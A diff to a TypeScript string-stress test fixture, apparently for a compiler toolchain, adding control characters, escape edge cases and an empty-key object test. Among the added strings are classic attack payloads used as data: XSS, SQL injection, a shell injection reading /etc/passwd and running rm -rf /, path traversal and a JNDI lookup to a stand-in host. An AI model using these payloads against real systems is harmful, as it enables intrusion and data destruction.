-  if (i === 118) { return "a ,\" b"; }
-  if (i === 119) { return "\","; }
-  if (i === 120) { return "\"\"\"\""; }
-  if (i === 121) { return "\"\"\"\"\""; }
-  if (i === 122) { return "\"\"\"\"\"\""; }
-  if (i === 123) { return "\"\\\""; }
-  if (i === 124) { return "\"\"\\\"\"\""; }
-  if (i === 125) { return "\"\\\\\""; }
-  if (i === 126) { return "pre\njump_label_0:"; }
-  if (i === 127) { return "x\njump_label_1:\npost"; }
-  if (i === 128) { return "body\n.catchall\nmore"; }
-  if (i === 129) { return "pre\n.function any n.e.f(any a0) <static> {"; }
-  if (i === 130) { return "pre\n.function any f(any a0, any a1) {"; }
-  if (i === 131) { return "lab\n\tldai 0x1\n\tjnez jump_label_9"; }
-  if (i === 132) { return "{\"k\":\"v\"}\n# STRING ====================\n😀tail"; }
-  if (i === 133) { return "multi\n[offset:0x1, name_value:x]\r\nevil‮x‬"; }
-  if (i === 134) { return "a\"b\\c\td\ne\rf\"g`h"; }
+  if (i === 99) { return "a"; }
+  if (i === 100) { return "a "; }
+  if (i === 101) { return " a"; }
+  if (i === 102) { return "a\n"; }
+  if (i === 103) { return "aa"; }
+  if (i === 104) { return "<img src=x onerror=\"alert('XSS')\">"; }
+  if (i === 105) { return "1' OR '1'='1' --"; }
+  if (i === 106) { return "; cat /etc/passwd & rm -rf /"; }
+  if (i === 107) { return "../../etc/passwd%00.png"; }
+  if (i === 108) { return "${jndi:ldap://evil.x/a}"; }
+  if (i === 109) { return "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpM"; }
+  if (i === 110) { return "https://x.io/a?b=1&c=\"d\"&e='f'"; }
+  if (i === 111) { return "Failed %{public}s cause: %{public}s"; }
+  if (i === 112) { return "<?xml v=\"1.0\"?><n a=\"b'c\"/>"; }
+  if (i === 113) { return "k: \"v\"\n  - 'w'\n# cmt"; }
+  if (i === 114) { return "HTTP/1.1 200 OK\r\nSet-Cookie: a=\"b\"\r\n\r\nbody"; }
+  if (i === 115) { return "# Title\n> quote \"x\"\n- item `y`\n"; }
+  if (i === 116) { return "0K5t9qQ2Xz7vBn4hR8wL3jF6uM1cA7dE5gT+4iY0sP=="; }
+  if (i === 117) { return "\", lead"; }
+  if (i === 118) { return "trail ,\""; }
+  if (i === 119) { return "a ,\" b"; }
+  if (i === 120) { return "\","; }
+  if (i === 121) { return "\"\"\"\""; }
+  if (i === 122) { return "\"\"\"\"\""; }
+  if (i === 123) { return "\"\"\"\"\"\""; }
+  if (i === 124) { return "\"\\\""; }
+  if (i === 125) { return "\"\"\\\"\"\""; }
+  if (i === 126) { return "\"\\\\\""; }
+  if (i === 127) { return "pre\njump_label_0:"; }
+  if (i === 128) { return "x\njump_label_1:\npost"; }
+  if (i === 129) { return "body\n.catchall\nmore"; }
+  if (i === 130) { return "pre\n.function any n.e.f(any a0) <static> {"; }
+  if (i === 131) { return "pre\n.function any f(any a0, any a1) {"; }
+  if (i === 132) { return "lab\n\tldai 0x1\n\tjnez jump_label_9"; }
+  if (i === 133) { return "\u0002"; }
+  if (i === 134) { return "\u0003"; }
+  if (i === 135) { return "\u0004"; }
+  if (i === 136) { return "\u0005"; }
+  if (i === 137) { return "\u0006"; }
+  if (i === 138) { return "\u0007"; }
+  if (i === 139) { return "\u0008"; }
+  if (i === 140) { return "\t"; }
+  if (i === 141) { return "\n"; }
+  if (i === 142) { return "\u000b"; }
+  if (i === 143) { return "\u000c"; }
+  if (i === 144) { return "\u000e"; }
+  if (i === 145) { return "\u000f"; }
+  if (i === 146) { return "\u0010"; }
+  if (i === 147) { return "\u0011"; }
+  if (i === 148) { return "\u0012"; }
+  if (i === 149) { return "\u0013"; }
+  if (i === 150) { return "\u0014"; }
+  if (i === 151) { return "\u0015"; }
+  if (i === 152) { return "\u0016"; }
+  if (i === 153) { return "\u0017"; }
+  if (i === 154) { return "\u0018"; }
+  if (i === 155) { return "\u0019"; }
+  if (i === 156) { return "\u001a"; }
+  if (i === 157) { return "\u001b"; }
+  if (i === 158) { return "\u001c"; }
+  if (i === 159) { return "\u001d"; }
+  if (i === 160) { return "\u001e"; }
+  if (i === 161) { return "\u001f"; }
+  if (i === 162) { return ""; }
+  if (i === 163) { return "{\"k\":\"v\"}\n# STRING ====================\n😀tail"; }
+  if (i === 164) { return "multi\n[offset:0x1, name_value:x]\r\nevil‮x‬"; }
+  if (i === 165) { return "a\"b\\c\td\ne\rf\"g`h"; }
   return "string-stress-fallback";
 }
 
@@ -154,6 +185,7 @@ export function stringStressArray(): Array<string> {
     "   ",
     "  padded  ",
     "]",
+    "a\u0000b",
     "]}",
     "] ] ]",
     "\"",
@@ -280,6 +312,36 @@ export function stringStressArray(): Array<string> {
     "pre\n.function any n.e.f(any a0) <static> {",
     "pre\n.function any f(any a0, any a1) {",
     "lab\n\tldai 0x1\n\tjnez jump_label_9",
+    "\u0002",
+    "\u0003",
+    "\u0004",
+    "\u0005",
+    "\u0006",
+    "\u0007",
+    "\u0008",
+    "\t",
+    "\n",
+    "\u000b",
+    "\u000c",
+    "\u000e",
+    "\u000f",
+    "\u0010",
+    "\u0011",
+    "\u0012",
+    "\u0013",
+    "\u0014",
+    "\u0015",
+    "\u0016",
+    "\u0017",
+    "\u0018",
+    "\u0019",
+    "\u001a",
+    "\u001b",
+    "\u001c",
+    "\u001d",
+    "\u001e",
+    "\u001f",
+    "",
     "{\"k\":\"v\"}\n# STRING ====================\n😀tail",
     "multi\n[offset:0x1, name_value:x]\r\nevil‮x‬",
     "a\"b\\c\td\ne\rf\"g`h",
@@ -331,7 +393,15 @@ export function stringStressFields(): string {
   for (const k in o) {
     s += k.length > 0 ? o[k] : '';
   }
-  return s + o[',k'] + o['jump_label_0:'];
+  return s + o[''] + o[',k'] + o['jump_label_0:'];
+}
+
+// 空 key 对象字面量（literal string:"" 空键）+ 空块模板（cooked/raw 空串）。
+export function stringStressEmptyShapes(x: number): string {
+  const emptyKey: Record<string, number> = { '': 1, 'a': 2 };
+  const chunked = `pre${x}suf`;
+  const emptyChunks = `${x}`;
+  return `ek=${emptyKey['']} c0=${chunked.length} c1=${emptyChunks.length}`;
 }
 
 // 面①补：throw.undefinedifholewithname（捕获变量洞检查，单字符串操作数形态）。
